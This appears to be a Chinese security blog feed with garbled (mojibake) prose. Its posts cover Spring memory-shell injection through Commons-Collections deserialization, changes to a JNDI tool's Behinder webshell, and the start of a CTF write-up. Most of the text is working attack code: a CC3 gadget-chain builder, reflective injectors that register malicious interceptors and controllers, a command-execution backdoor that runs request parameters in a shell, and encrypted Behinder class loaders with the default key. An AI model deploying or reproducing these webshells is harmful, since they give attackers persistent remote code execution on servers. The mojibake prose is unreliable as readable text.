ä¹Ÿå°±æ˜¯å¯¹åº”<code>SpringMemshell</code>æ¨¡å—<br>
åˆ†æä»£ç ï¼Œè¿™ä¸ªcodeCLasså¤„å°±æ˜¯å·¥å…·ç”¨çš„å†…å­˜é©¬ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1703942645272.png" alt="" loading="lazy"><br>
æˆ‘ä»¬å°†å®ƒå¤åˆ¶å‡ºæ¥ï¼Œè§£ç æˆclassçœ‹çœ‹<br>
<img src="https://sl3epf.github.io/post-images/1703943264159.png" alt="" loading="lazy"><br>
é€»è¾‘å¾ˆæ˜äº†ï¼Œå‰é¢çš„ifæä¾›äº†ä¸€ä¸ªé¡µé¢å›æ˜¾çš„é©¬ï¼Œåé¢elseå°±æ˜¯é­”æ”¹åçš„å†°è<br>
å®ƒçš„å¯†ç md5è§£å¯†åä¾ç„¶æ˜¯rebeyondï¼Œè¿æ¥éœ€è¦å¤šåŠ ä¸€ä¸ª<code>X-Options-Ai</code>çš„è¯·æ±‚å¤´ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¿˜æ˜¯è¿ä¸ä¸Šå‘¢ï¼Ÿ<br>
æˆ‘ä»¬è¦æ³¨æ„æœ‰ä¸€è¡Œ<code>Method targetMethod = evilClass.getDeclaredMethod(&quot;equals&quot;, ServletRequest.class, ServletResponse.class);</code><br>
æƒ³èµ·æ¥ä¹‹å‰åˆ†æå†°èçš„é©¬ï¼Œæœ€åæ˜¯equalsæ¥æ”¶äº†jspçš„ä¸Šä¸‹æ–‡å¯¹è±¡<code>pageContext</code>ï¼Œæœ‰è¿™ä¸ªè·å–requestå’Œresponseï¼Œè€Œrequeståˆå¯ä»¥è·å–sessionã€‚æœ‰äº†å®ƒä»¬å°±èƒ½æ‰§è¡Œwebshellçš„æ“ä½œã€‚<br>
æ‰€ä»¥è¯´ä¸èƒ½ç”¨å‘¢ï¼Œå†°èè¿™é‡Œæ˜¯æ¥æ”¶ä¸€ä¸ªå‚æ•°<br>
<img src="https://sl3epf.github.io/post-images/1704001584739.png" alt="" loading="lazy"><br>
è€Œjndiå·¥å…·çš„equalsæ–¹æ³•ä¼ å…¥çš„æ˜¯ä¸¤ä¸ªå‚æ•°ã€‚</p>
<h1 id="æ”¹é€ ">æ”¹é€ </h1>
<p>å…¶å®è¦æ”¹ä¹Ÿå¾ˆç®€å•ï¼Œå°†å…¶ä¸­å†°èçš„é€»è¾‘æ¢æˆè‡ªå·±çš„å°±è¡Œäº†ã€‚<br>
æˆ‘ä»¬å…ˆæŠŠåŸæ¥çš„<code>DynamicInterceptorTemplate.java</code>æ‹¿å‡ºæ¥ï¼Œæ‰¾åˆ°å†°èçš„é€»è¾‘éƒ¨åˆ†è¿›è¡Œä¿®æ”¹</p>
<p>è¿™é‡Œè¿˜éœ€è¦çŸ¥é“ä¸€ä¸ªç‚¹ã€‚æš‚æ—¶æ²¡æœ‰åŠæ³•ä»springå’Œtomcatä¸­è·å–pageContextï¼Œä½†æ˜¯å¥½åœ¨æ–°ç‰ˆå†°èæœåŠ¡ç«¯å·²ç»ä¸å†ä¾èµ–pageContextï¼Œå¯ä»¥çœ‹https://github.com/rebeyond/Behinder/issues/151<br>
æˆ‘ä»¬åªéœ€è¦ä¼ å…¥requestå’Œresponseï¼Œç„¶åé€šè¿‡HashMapæ·»åŠ <br>
<img src="https://sl3epf.github.io/post-images/1703949212902.png" alt="" loading="lazy"><br>
æ›´æ”¹ä»£ç å¦‚ä¸‹</p>
<pre><code class="language-java">else if (request.getHeader(this.behinderShellHeader) != null) {
            try {
                if (request.getMethod().equals(&quot;POST&quot;)) {
                    //System.out.println(&quot;QiuQIu&quot;);
                    HttpSession session = request.getSession();
                    HashMap pageContext = new HashMap();
                    pageContext.put(&quot;request&quot;, request);
                    pageContext.put(&quot;response&quot;,response);
                    pageContext.put(&quot;session&quot;,session);
                    k = this.behinderShellPwd;
                    session.setAttribute(&quot;u&quot;, k);
                    cipher = Cipher.getInstance(&quot;AES&quot;);
                    cipher.init(2, new SecretKeySpec((session.getAttribute(&quot;u&quot;) + &quot;&quot;).getBytes(), &quot;AES&quot;));
                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));// base64è§£ç +AESè§£å¯†
                    Method defineClass = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class evilClass = (Class) defineClass.invoke(this.getClass().getClassLoader(), evilClassBytes, 0, evilClassBytes.length);
                    evilClass.newInstance().equals(pageContext);
                    //System.out.println(&quot;QiuYYDS&quot;);
                    return false;
                }
</code></pre>
<p>ç„¶åå°±æ˜¯ç¼–è¯‘ç„¶åbase64æ¥ç€æ›¿æ¢æ‰åŸå…ˆçš„codeClass</p>
<h1 id="æ•ˆæœ">æ•ˆæœ</h1>
<p>åŸå·¥å…·æ‰“èƒ½æ‰“é€šï¼Œæœ‰cmdçš„å›æ˜¾ä½†æ˜¯å†°èçš„ğŸæ˜¯è¿æ¥ä¸ä¸Šçš„<br>
<img src="https://sl3epf.github.io/post-images/1703948603124.png" alt="" loading="lazy"><br>
æ”¹é€ å<br>
<img src="https://sl3epf.github.io/post-images/1703949449565.png" alt="" loading="lazy"><br>
æ³¨æ„ï¼Œå¦‚æœä½ æ˜¯ç”¨æˆ‘è¿™ç¯‡æ–‡ç« çš„é¶åœºç¯å¢ƒï¼Œåœ¨è¿æ¥çš„æ—¶å€™æ˜¯éœ€è¦æ·»åŠ cookieå‚æ•°çš„ã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æ ¹æ®æ­¤æ€è·¯ä¹Ÿå¯ä»¥å†ä¿®æ”¹å…¶ä»–çš„ğŸï¼Œè¿™æ¬¡æˆ‘åªæ˜¯é‡åˆ°äº†ä»–ä¸æ”¯æŒspringçš„å†°èã€‚tomcatçš„å¯ä»¥ç”¨TomcatMemshell3ï¼Œè¿™ä¸ªæ˜¯æ”¯æŒæˆ‘ä»¬å¹³å¸¸ç”¨çš„å†°èå®¢æˆ·ç«¯çš„ã€‚<br>
å½“ç„¶ä½ ä¹Ÿå¯ä»¥äºŒæ”¹å†°èå»é€‚é…jndiå·¥å…·ï¼Œæˆ‘è§‰å¾—æ¯”è¾ƒéº»çƒ¦ã€‚<br>
è¯¦æƒ…å¯è§å¸Œè°­å®éªŒå®¤çš„æ–‡ç«  https://mp.weixin.qq.com/s/qE_AArdpAVL-EoBbILb_Jg</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å†…å­˜é©¬å°è®°]]></title>
        <id>https://sl3epf.github.io/post/iXD_sv0an/</id>
        <link href="https://sl3epf.github.io/post/iXD_sv0an/">
        </link>
        <updated>2023-12-29T02:56:59.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>è®°å½•ä¸€ä¸‹åˆ©ç”¨CCé“¾æˆ–è€…fastjsonç­‰æ‰“å†…å­˜é©¬çš„ä¸€äº›å‘ç‚¹ï¼Œä»¥åŠæ³¨å…¥å†°èçš„å†…å­˜é©¬ã€‚<br>
ä¸æ˜¯è°ƒè¯•åˆ†æçš„æ–‡ç« ï¼ˆè¿™ä¸ªè‡ªå·±åšæœ¬åœ°å·®ä¸å¤šäº†ï¼Œæ„Ÿè§‰ç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½å·®ä¸å¤šï¼Œä¸æƒ³æå¾—å¾ˆå¤§çš„ç¯‡å¹…ï¼Œæ˜ç™½ä»€ä¹ˆinterceptoråœ¨å“ªé‡ŒåŠ å…¥çš„ï¼Œç¨‹åºæ˜¯å¦‚ä½•åˆ°è¾¾controllerå±‚çš„ï¼Œè°ƒç”¨ä»€ä¹ˆæ–¹æ³•æ³¨å†Œcontrollerè·¯ç”±çš„ç­‰ç­‰ã€‚èƒ½çœ‹æ‡‚ä»£ç çŸ¥é“å“ªå‡ è¡Œæ˜¯è·å–ä»€ä¹ˆï¼Œæ¶æ„ç±»åœ¨é‚£ä¸ªåœ°æ–¹æ³¨å…¥çš„ã€‚)<br>
åšä¸ªè®°å½•æ–¹ä¾¿ä»¥åæ“ä½œã€‚</p>
<h1 id="ç¯å¢ƒ">ç¯å¢ƒ</h1>
<p>æ–¹ä¾¿èµ·è§ç›´æ¥ç”¨SpringBootäº†</p>
<pre><code class="language-java">  &lt;parent&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
    &lt;version&gt;2.4.5&lt;/version&gt;
    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
  &lt;/parent&gt;

    &lt;dependency&gt;
      &lt;groupId&gt;commons-collections&lt;/groupId&gt;
      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
      &lt;version&gt;3.2.1&lt;/version&gt;
    &lt;/dependency&gt;

    &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
    &lt;/dependency&gt;

  &lt;/dependencies&gt;
&lt;/project&gt;
</code></pre>
<p>æ¼æ´ç‚¹</p>
<pre><code class="language-java">@RestController
public class VulController {
    @RequestMapping(&quot;/vul&quot;)
    @ResponseBody
    public String vul(HttpServletRequest request, HttpServletResponse response, String payload) throws IOException, ClassNotFoundException {
        if (payload != null) {
            System.out.println(payload);
            byte[] decode = Base64.getDecoder().decode(payload);
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            return &quot;attack success&quot;;
        }
        return &quot;payload null&quot;;
    }
}
</code></pre>
<h1 id="interceptorå†…å­˜é©¬åˆ©ç”¨">Interceptorå†…å­˜é©¬åˆ©ç”¨</h1>
<h2 id="ä¸€-å‡†å¤‡">ä¸€ã€å‡†å¤‡</h2>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œå°†è‡ªå®šä¹‰çš„Interceptorç±»åŠ å…¥åˆ°RequestMappingHandlerMappingç±»çš„adaptedInterceptorså±æ€§ä¸­å³å¯æ³¨å†Œä¸€ä¸ªæ‹¦æˆªå™¨ã€‚<br>
å¦‚ä¸‹</p>
<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import java.lang.reflect.Field;

public class InterMemShell extends AbstractTranslet {
    static {
        try
        {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
            AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class);
            Field field = null;

            field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);

            field.setAccessible(true);
            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = null;

            adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);

            String className = &quot;magicInterceptor&quot;;
            //åŠ è½½magicInterceptorç±»çš„å­—èŠ‚ç 
            String b64 = &quot;base64 class&quot;;
            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
            m0.setAccessible(true);
            m0.invoke(classLoader, className, bytes, 0, bytes.length);
            //æ·»åŠ com.example.spring.magicInterceptorç±»åˆ°adaptedInterceptors
            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());

        } catch (Exception e){
            e.printStackTrace();
        }


    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªç±»åä¸ºmagicInterceptor(å¯ä»¥è‡ªå®šä¹‰ï¼Œå½“ç„¶ä¹Ÿè¦ä¿®æ”¹ä¸Šé¢çš„className)çš„æ‹¦æˆªå™¨ï¼Œé‡å†™preHandleæ–¹æ³•ã€‚</p>
<pre><code class="language-java">import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Method;
import java.util.HashMap;

public class magicInterceptor extends HandlerInterceptorAdapter{
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
       String code = request.getParameter(&quot;qiu&quot;);
       if(code != null){
           try {
               java.io.PrintWriter writer = response.getWriter();
               String o = &quot;&quot;;
               ProcessBuilder p;
               if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)){
                   p = new ProcessBuilder(new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, code});
               }else{
                   p = new ProcessBuilder(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, code});
               }
               java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\\\A&quot;);
               o = c.hasNext() ? c.next(): o;
               c.close();
               writer.write(o);
               writer.flush();
               writer.close();
           }catch (Exception e){
               e.printStackTrace();
           }
           return false;
       }
        return true;
    }
}
</code></pre>
<p>æˆ‘è¿™é‡Œåˆ©ç”¨CC3çš„LazyMap + TemplatesImplé“¾å­æ‰“</p>
<pre><code class="language-java">package Qiu;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        TemplatesImpl templates = new TemplatesImpl();
        Class templateClass = templates.getClass();
        Field nameFiled = templateClass.getDeclaredField(&quot;_name&quot; );
        nameFiled.setAccessible(true);
        nameFiled.set(templates, &quot;qiuqiu&quot;);

        Field bytecodesFiled = templateClass.getDeclaredField(&quot;_bytecodes&quot; );
        bytecodesFiled.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get(&quot;xxx.class&quot;));
        byte[][] codes = {code};
        bytecodesFiled.set(templates, codes);

        Field _tfField = templateClass.getDeclaredField(&quot;_tfactory&quot;);
        _tfField.setAccessible(true);
        _tfField.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer(&quot;newTransformer&quot;, null, null)};

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
        Map&lt;Object, Object&gt; Lazymap = LazyMap.decorate(map, chainedTransformer);

        Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler h = (InvocationHandler) constructor.newInstance(Override.class, Lazymap);

        //ä¸€ä¸ªç±»è¢«åŠ¨æ€ä»£ç†äº†ä¹‹åï¼Œæƒ³è¦é€šè¿‡ä»£ç†è°ƒç”¨è¿™ä¸ªç±»çš„æ–¹æ³•ï¼Œå°±ä¸€å®šä¼šè°ƒç”¨ invoke() æ–¹æ³•ã€‚
        Map maproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),// ä¼ å…¥ClassLoader
                new Class[]{Map.class},// ä¼ å…¥è¦å®ç°çš„æ¥å£
                h);// ä¼ å…¥å¤„ç†è°ƒç”¨æ–¹æ³•çš„InvocationHandler
        Object o = constructor.newInstance(Override.class, maproxy);
        serialize(o);
        //unserialize(&quot;ser.bin&quot;);
    }

    public static void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
</code></pre>
<p>å†å‡†å¤‡ä¸€ä¸ªBase64ç¼–ç çš„å·¥å…·ç±»ï¼Œå› ä¸ºåé¢è‚¯å®šéœ€è¦å¯¹å­—èŠ‚ç è¿›è¡Œç¼–ç ä¼ è¾“</p>
<pre><code class="language-java">package Qiu;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class B64Evil {
    public static void main(String[] args) throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get(&quot;magicInterceptor.class&quot;));
        System.out.println(Base64.getEncoder().encodeToString(code1));
        byte[] code = Files.readAllBytes(Paths.get(&quot;ser.bin&quot;));
        System.out.println(Base64.getEncoder().encodeToString(code));
    }
}
</code></pre>
<h2 id="äºŒ-ç¼–è¯‘åˆ©ç”¨">äºŒã€ç¼–è¯‘åˆ©ç”¨</h2>
<p>æ¥ä¸‹æ¥å°±éœ€è¦è¿›è¡Œç¼–è¯‘æ¶æ„ç±»äº†ã€‚<br>
æœ‰äº›æ–‡ç« è¯´ç›´æ¥ç”¨ideaç¼–è¯‘çš„ï¼Œä½†æ˜¯ideaç¼–è¯‘æ˜¯ä¼šè‡ªå¸¦é‚£ä¸ªpackageåŒ…åçš„ï¼Œå¦‚æœæœ‰è¿™ä¸ªæœ€ååˆ©ç”¨çš„æ—¶å€™ä¼šæŠ¥.NoClassDefFoundErrorçš„é”™ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯æ€ä¹ˆåˆ©ç”¨æˆåŠŸçš„ã€‚<br>
æ‰€ä»¥å°±å¾—ç”¨javacç¼–è¯‘ï¼Œå¦‚æœç›´æ¥<code>javac xxx.java</code>ä¼šæŠ¥ä¸€å †çš„é”™è¯¯ï¼Œå› ä¸ºæ˜¯æ‰¾ä¸åˆ°ä¾èµ–çš„ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨cpå‚æ•°ã€‚<br>
è¿™é‡Œæ”¾å‡ºæˆ‘çš„å‘½ä»¤ï¼Œè¿™é‡Œçš„jaråŒ…æˆ‘å…¨éƒ¨æ”¾åœ¨å½“å‰æ–‡ä»¶å¤¹äº†ã€‚ç‰ˆæœ¬çš„è¯è‡ªè¡Œæµ‹è¯•ã€‚</p>
<pre><code class="language-shell">javac -cp .:spring-web-4.3.28.RELEASE.jar:spring-webmvc-4.3.28.RELEASE.jar:javax.servlet-api-3.1.0.jar:spring-context-4.3.28.RELEASE.jar:spring-beans-4.3.28.RELEASE.jar:spring-core-4.3.28.RELEASE.jar InterMemShell.java
</code></pre>
<p>é¦–å…ˆç¼–è¯‘å¥½<code>magicInterceptor</code>ï¼ˆä¹Ÿå°±æ˜¯ä½ é‡å†™preHandleæ–¹æ³•çš„ğŸï¼‰<br>
ç„¶åå¯¹classè¿›è¡Œbase64ç¼–ç ï¼Œæ”¾å…¥<code>InterMemShell</code>ä¸­ï¼Œç„¶åç”¨åŒæ ·çš„å‘½ä»¤å¯¹<code>InterMemShell</code>è¿›è¡Œç¼–è¯‘<br>
æ¥ç€åˆ©ç”¨CC3åºåˆ—åŒ–æˆser.binæ–‡ä»¶ï¼Œç„¶åå¯¹å®ƒè¿›è¡Œbase64ç¼–ç æ‰“å…¥ï¼Œå‘åŒ…çš„æ—¶å€™éœ€è¦urlç¼–ç <br>
<img src="https://sl3epf.github.io/post-images/1703832466325.jpg" alt="" loading="lazy"></p>
<h2 id="ä¸‰-æ³¨å…¥å†°èå†…å­˜é©¬">ä¸‰ã€æ³¨å…¥å†°èå†…å­˜é©¬</h2>
<p>å…ˆçœ‹çœ‹å†°èçš„ğŸ</p>
<pre><code class="language-jsp">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;
    &lt;%!class U extends ClassLoader{
        U(ClassLoader c){super(c);
        }
    public Class g(byte []b){
        return super.defineClass(b,0,b.length);}
    }%&gt;
        &lt;%if (request.getMethod().equals(&quot;POST&quot;)){
            String k=&quot;e45e329feb5d925b&quot;;/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/
            session.putValue(&quot;u&quot;,k);
            Cipher c=Cipher.getInstance(&quot;AES&quot;);
            c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
            new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
        }
        %&gt;
</code></pre>
<p>å°†ä¹‹å‰çš„ğŸæ›¿æ¢ä¸ºå†°èçš„é€»è¾‘</p>
<pre><code class="language-java">public class magicInterceptor extends HandlerInterceptorAdapter{
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        
        HttpSession session = request.getSession();

        HashMap pageContext = new HashMap();
        pageContext.put(&quot;request&quot;,request);
        pageContext.put(&quot;response&quot;,response);
        pageContext.put(&quot;session&quot;,session);
        try {
            if (request.getMethod().equals(&quot;POST&quot;)) {
                String k=&quot;e45e329feb5d925b&quot;;/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/
                session.putValue(&quot;u&quot;,k);
                Cipher c=Cipher.getInstance(&quot;AES&quot;);
                c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
                Method method = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
            }
        } catch (Exception e){
            e.printStackTrace();
        }

        return true;
    }
}
</code></pre>
<p>åŒæ ·çš„æ–¹æ³•è¿›è¡Œç¼–è¯‘æ³¨å…¥<br>
<img src="https://sl3epf.github.io/post-images/1703837004015.jpg" alt="" loading="lazy"></p>
<h1 id="controllerå†…å­˜é©¬åˆ©ç”¨">Controllerå†…å­˜é©¬åˆ©ç”¨</h1>
<p>å†°èé€»è¾‘ğŸå­</p>
<pre><code class="language-java">import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Method;
import java.util.HashMap;

public class magicController {
        public void shell() throws Exception {
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
            HttpSession session = request.getSession();
            //create pageContext
            HashMap pageContext = new HashMap();
            pageContext.put(&quot;request&quot;,request);
            pageContext.put(&quot;response&quot;,response);
            pageContext.put(&quot;session&quot;,session);
            try {
                if (request.getMethod().equals(&quot;POST&quot;)) {
                    String k=&quot;e45e329feb5d925b&quot;;/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/
                    session.putValue(&quot;u&quot;,k);
                    Cipher c=Cipher.getInstance(&quot;AES&quot;);
                    c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));
                    Method method = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                    Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
                    evilclass.newInstance().equals(pageContext);
                }
            } catch (Exception e){
                e.printStackTrace();
            }
        }
}
</code></pre>
<p>æ³¨å…¥æ¶æ„controllerå†…å­˜é©¬</p>
<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import java.lang.reflect.Method;


public class ConMemShell extends AbstractTranslet {
    static {
        try {
            String className = &quot;magicController&quot;;
            //åŠ è½½magicControllerç±»çš„å­—èŠ‚ç 
            String b64 = &quot;b64&quot;;
            byte[] d = new sun.misc.BASE64Decoder().decodeBuffer(b64);
            java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, new Class[]{String.class, byte[].class, int.class, int.class});
            m.setAccessible(true);
            m.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{className, d, 0, d.length});
            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
            PatternsRequestCondition url = new PatternsRequestCondition(&quot;/qiu&quot;);
            RequestMappingInfo info = new RequestMappingInfo(url, null, null, null, null, null, null);
            RequestMappingHandlerMapping rs = context.getBean(RequestMappingHandlerMapping.class);
            Method mm = Class.forName(className).getMethod(&quot;shell&quot;);
            rs.registerMapping(info, Class.forName(className).newInstance(), mm);
        }catch (Exception e){
            e.printStackTrace();
        }

    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

}
</code></pre>
<p>åŒæ ·åˆ©ç”¨CC3æ‰“æ³¨å…¥ï¼ŒæˆåŠŸè¿æ¥<br>
<img src="https://sl3epf.github.io/post-images/1703862511248.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[HZNUCTF 2023 final]ezjava]]></title>
        <id>https://sl3epf.github.io/post/TRjx_WdgE/</id>
        <link href="https://sl3epf.github.io/post/TRjx_WdgE/">
        </link>
        <updated>2023-12-26T11:20:20.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>log4j2 + fastjsonåŸç”Ÿååºåˆ—åŒ– + é«˜ç‰ˆæœ¬JNDIæ³¨å…¥ç»•è¿‡<br>
æ²¡æœ‰è€ƒé‚£äº›ç»•è¿‡çš„tricksï¼Œè¿™äº›ç¯å¢ƒå®æˆ˜ä¹Ÿæœ‰æŒºå¤šçš„ï¼ŒæŒºä¸é”™ã€‚</p>
<h1 id="åˆ†æ">åˆ†æ</h1>
<p>é¦–å…ˆè¿›é¢˜ç›®å°±æç¤ºä½ <br>
<img src="https://sl3epf.github.io/post-images/1703734647056.png" alt="" loading="lazy"><br>
ä¼šè®°å½•æˆ‘ä»¬åœ¨urlä¸Šçš„å‚æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥æƒ³åˆ°ä¸€ä¸ªlog4j2çš„æ¼æ´ï¼Œæˆ‘ä»¬å°è¯•æ‰“ä¸€ä¸‹å‘ç°èƒ½æ¥æ”¶åˆ°dnslogè¯·æ±‚<br>
<img src="https://sl3epf.github.io/post-images/1703734721774.png" alt="" loading="lazy"><br>
javaç‰ˆæœ¬æ˜¯8u222ï¼Œè¿™ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚<br>
è¿™é‡Œå¦‚æœç›´æ¥å°è¯•åˆ©ç”¨log4j2å¼¹shellæ˜¯ä¸å¯è¡Œçš„ï¼Œè¿™é‡Œå…·ä½“ä¸æ¸…æ¥šæ˜¯æ€ä¹ˆå®ç°çš„ï¼Œå¯èƒ½æ˜¯åšäº†åˆ¤æ–­åªå‰©ä¸‹fastjsonèƒ½å¤Ÿåˆ©ç”¨ã€‚<br>
